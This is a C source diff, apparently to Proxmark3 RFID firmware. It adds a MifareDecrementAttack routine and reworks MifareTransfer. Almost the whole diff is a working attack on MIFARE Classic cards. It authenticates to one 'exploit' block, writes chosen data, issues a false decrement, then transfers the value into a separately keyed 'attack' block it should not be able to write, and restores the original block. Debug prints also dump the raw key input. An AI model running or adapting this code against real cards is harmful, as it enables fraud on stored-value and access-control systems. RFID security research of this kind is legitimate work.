@@ -640,6 +640,134 @@ OUT:
     set_tracing(false);
     BigBuf_free();
 }
+
+void MifareDecrementAttack(uint8_t arg0, uint8_t arg1, uint8_t *datain) {
+    /* cmddata structure:
+        | keytypeAttack | keyAttack | keytypeExploit | keyExploit |   data   |
+        | 1 byte        | 6 bytes   | 1 byte         | 6 bytes    | 16 bytes |
+        0               1           7               8           14          30
+    */
+
+    // params
+    uint8_t blockAttackno = arg0;
+    uint8_t blockExploitno = arg1;
+    uint8_t keytypeAttack = datain[0];
+    uint8_t keytypeExploit = datain[7];
+    uint64_t ui64keyAttack = bytes_to_num(datain + 1, 6);
+    uint64_t ui64keyExploit = bytes_to_num(datain + 8, 6);
+    uint8_t blockdata[16] = {0x00};
+    memcpy(blockdata, datain + 14, 16);
+
+    // variables
+    uint8_t isOK = 0;
+    uint8_t uid[10] = {0x00};
+    uint32_t cuid = 0;
+    struct Crypto1State mpcs = {0, 0};
+    struct Crypto1State *pcs;
+    pcs = &mpcs;
+
+    Dbprintf("datain: %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u %u", datain[0], datain[1], datain[2], datain[3], datain[4], datain[5], datain[6], datain[7], datain[8], datain[9], datain[10], datain[11], datain[12], datain[13], datain[14], datain[15], datain[16], datain[17], datain[18], datain[19], datain[20], datain[21], datain[22], datain[23], datain[24], datain[25], datain[26], datain[27], datain[28], datain[29], datain[30]);
+    
+    iso14443a_setup(FPGA_HF_ISO14443A_READER_LISTEN);
+
+    clear_trace();
+    set_tracing(true);
+
+    LED_A_ON();
+    LED_B_OFF();
+    LED_C_OFF();
+    
+    uint8_t dataoutbuf[16] = {0x00};
+
+    while (true) {
+        if (!iso14443a_select_card(uid, NULL, &cuid, true, 0, true)) {
+            if (g_dbglevel >= DBG_ERROR) Dbprintf("Can't select card");
+            break;
+        };
+
+        Dbprintf("Auth to exploit block");
+        if (mifare_classic_auth(pcs, cuid, blockExploitno, keytypeExploit, ui64keyExploit, AUTH_FIRST)) {
+            if (g_dbglevel >= DBG_ERROR) Dbprintf("Auth error");
+            break;
+        };
+
+        Dbprintf("Backup exploit block");
+        if (mifare_classic_readblock(pcs, cuid, blockExploitno, dataoutbuf)) {
+            if (g_dbglevel >= DBG_ERROR) Dbprintf("Read block error");
+            break;
+        };
+
+        Dbprintf("Write to exploit block");
+        int res = mifare_classic_writeblock(pcs, cuid, blockExploitno, blockdata);
+        if (res == PM3_ETEAROFF) {
+            Dbprintf("Write ok");
+        } else if (res) {
+            if (g_dbglevel >= DBG_ERROR) Dbprintf("Write block error");
+        }
+
+        Dbprintf("False decrement to exploit block");
+        if (mifare_classic_value(pcs, cuid, blockExploitno, 0x00, 0x01)) {
+            if (g_dbglevel >= DBG_ERROR) Dbprintf("Write decrement block error");
+            break;
+        };
+
+        Dbprintf("Auth to attack block");
+        if (mifare_classic_auth(pcs, cuid, blockAttackno, keytypeAttack, ui64keyAttack, AUTH_NESTED)) {
+            if (g_dbglevel >= DBG_ERROR) Dbprintf("Auth attack block error");
+            break;
+        };
+
+        Dbprintf("Transfer to attack block");
+        if (mifare_classic_transfer(pcs, cuid, blockAttackno)) {
+            if (g_dbglevel >= DBG_ERROR) Dbprintf("Write block error");
+            break;
+        };
+
+        Dbprintf("Halting");
+        if (mifare_classic_halt(pcs, cuid)) {
+            if (g_dbglevel >= DBG_ERROR) Dbprintf("Halt error");
+            break;
+        };
+
+        if (!iso14443a_select_card(uid, NULL, &cuid, true, 0, true)) {
+            if (g_dbglevel >= DBG_ERROR) Dbprintf("Can't select card");
+            break;
+        };
+
+        Dbprintf("Second auth to exploit block");
+        if (mifare_classic_auth(pcs, cuid, blockExploitno, keytypeExploit, ui64keyExploit, AUTH_FIRST)) {
+            if (g_dbglevel >= DBG_ERROR) Dbprintf("Auth error");
+            break;
+        };
+
+        Dbprintf("Restore exploit block");
+        res = mifare_classic_writeblock(pcs, cuid, blockExploitno, dataoutbuf);
+        if (res == PM3_ETEAROFF) {
+            Dbprintf("Write ok");
+        } else if (res) {
+            if (g_dbglevel >= DBG_ERROR) Dbprintf("Write block error");
+        }
+
+        if (mifare_classic_halt(pcs, cuid)) {
+            if (g_dbglevel >= DBG_ERROR) Dbprintf("Halt error");
+            break;
+        };
+
+        isOK = 1;
+        break;
+    }
+
+    crypto1_deinit(pcs);
+
+    if (g_dbglevel >= 2) DbpString("WRITE BLOCK FINISHED");
+
+    reply_mix(CMD_ACK, isOK, 0, 0, 0, 0);
+
+    FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
+    LEDsoff();
+    set_tracing(false);
+}
+
 void MifareTransfer(uint8_t arg0, uint8_t arg1, uint8_t *datain) {
     // params
     uint8_t blockNo1 = arg0;
@@ -647,6 +775,8 @@ void MifareTransfer(uint8_t arg0, uint8_t arg1, uint8_t *datain) {
     uint8_t keyType = arg1;
     uint64_t ui64Key1 = 0;
     uint64_t ui64Key2 = 0;
+    uint8_t blockdata[16] = {0x00};
+    memcpy(blockdata, datain + 16, 16);
 
     ui64Key1 = bytes_to_num(datain, 6);
     ui64Key2 = bytes_to_num(datain + 10, 6);
@@ -658,7 +788,8 @@ void MifareTransfer(uint8_t arg0, uint8_t arg1, uint8_t *datain) {
     struct Crypto1State mpcs = {0, 0};
     struct Crypto1State *pcs;
     pcs = &mpcs;
-
+    Dbprintf("blockNo1: %u, blockNo2: %u, keyType: %u, ui64Key1: %016x, ui64Key2: %012x, keyType: %u", blockNo1, blockNo2, keyType, ui64Key1, ui64Key2, keyType);
+    Dbprintf("datain: %u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u", datain[0], datain[1], datain[2], datain[3], datain[4], datain[5], datain[6], datain[7], datain[8], datain[9], datain[10], datain[11], datain[12], datain[13], datain[14], datain[15], datain[16], datain[17], datain[18], datain[19], datain[20], datain[21], datain[22], datain[23], datain[24], datain[25], datain[26], datain[27], datain[28], datain[29], datain[30], datain[31]);
     iso14443a_setup(FPGA_HF_ISO14443A_READER_LISTEN);
 
     clear_trace();
@@ -667,6 +798,8 @@ void MifareTransfer(uint8_t arg0, uint8_t arg1, uint8_t *datain) {
     LED_A_ON();
     LED_B_OFF();
     LED_C_OFF();
+
+    uint8_t dataoutbuf[16] = {0x00};
 
     while (true) {
         if (!iso14443a_select_card(uid, NULL, &cuid, true, 0, true)) {
@@ -679,13 +812,25 @@ void MifareTransfer(uint8_t arg0, uint8_t arg1, uint8_t *datain) {
             break;
         };
 
-        if (mifare_classic_restore(pcs, cuid, blockNo1)) {
+        if (mifare_classic_readblock(pcs, cuid, blockNo1, dataoutbuf)) {
+            if (g_dbglevel >= DBG_ERROR) Dbprintf("Read block error");
+            break;
+        };
+
+        int res = mifare_classic_writeblock(pcs, cuid, blockNo1, blockdata);
+        if (res == PM3_ETEAROFF) {
+            Dbprintf("Write ok");
+        } else if (res) {
             if (g_dbglevel >= DBG_ERROR) Dbprintf("Write block error");
+        }
+
+        if (mifare_classic_value(pcs, cuid, blockNo1, 0x00, 0x01)) {
+            if (g_dbglevel >= DBG_ERROR) Dbprintf("Write decrement block error");
             break;
         };
 
         if (mifare_classic_auth(pcs, cuid, blockNo2, keyType, ui64Key2, AUTH_NESTED)) {
-            if (g_dbglevel >= DBG_ERROR) Dbprintf("Auth error");
+            if (g_dbglevel >= DBG_ERROR) Dbprintf("Second Auth error");
             break;
         };
 
@@ -693,6 +838,28 @@ void MifareTransfer(uint8_t arg0, uint8_t arg1, uint8_t *datain) {
             if (g_dbglevel >= DBG_ERROR) Dbprintf("Write block error");
             break;
         };
+
+        if (mifare_classic_halt(pcs, cuid)) {
+            if (g_dbglevel >= DBG_ERROR) Dbprintf("Halt error");
+            break;
+        };
+
+        if (!iso14443a_select_card(uid, NULL, &cuid, true, 0, true)) {
+            if (g_dbglevel >= DBG_ERROR) Dbprintf("Can't select card");
+            break;
+        };
+
+        if (mifare_classic_auth(pcs, cuid, blockNo1, keyType, ui64Key1, AUTH_FIRST)) {
+            if (g_dbglevel >= DBG_ERROR) Dbprintf("Auth error");
+            break;
+        };
+
+        res = mifare_classic_writeblock(pcs, cuid, blockNo1, dataoutbuf);
+        if (res == PM3_ETEAROFF) {
+            Dbprintf("Write ok");
+        } else if (res) {
+            if (g_dbglevel >= DBG_ERROR) Dbprintf("Write block error");
+        }
 
         if (mifare_classic_halt(pcs, cuid)) {
             if (g_dbglevel >= DBG_ERROR) Dbprintf("Halt error");
